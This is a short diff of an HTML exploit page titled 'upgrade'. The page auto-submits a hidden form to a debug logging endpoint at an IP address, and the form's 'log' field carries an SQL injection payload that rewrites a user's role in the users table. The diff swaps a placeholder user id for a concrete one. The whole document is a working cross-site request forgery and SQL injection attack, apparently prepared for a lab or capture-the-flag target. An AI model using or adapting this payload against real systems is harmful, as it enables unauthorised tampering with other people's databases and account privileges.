@@ -2,7 +2,6 @@
 <meta charset="utf-8">
 <title>upgrade</title>
 <form id="f" action="http://91.107.176.228:4000/debug/create_log" method="POST">
-  <!-- 50-char payload, no '-' or '/' -->
-  <input name="log" value="x';UPDATE users SET role='user' WHERE id=YOUR_ID;SELECT'">
+  <input name="log" value="x';update users set role='user'where id=13;select'">
 </form>
 <script>document.getElementById('f').submit();</script>
